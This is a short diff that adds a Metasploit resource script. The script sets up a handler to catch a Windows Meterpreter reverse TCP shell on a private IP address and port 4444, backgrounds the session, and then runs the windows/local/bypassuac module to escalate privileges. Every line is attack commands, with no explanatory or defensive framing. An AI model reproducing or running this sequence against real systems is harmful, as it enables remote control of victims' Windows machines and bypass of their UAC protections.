@@ -1,0 +1,9 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set session 1
+set LHOST 192.168.52.131
+set LPORT 4444
+run
+background
+use exploit/windows/local/bypassuac
+run
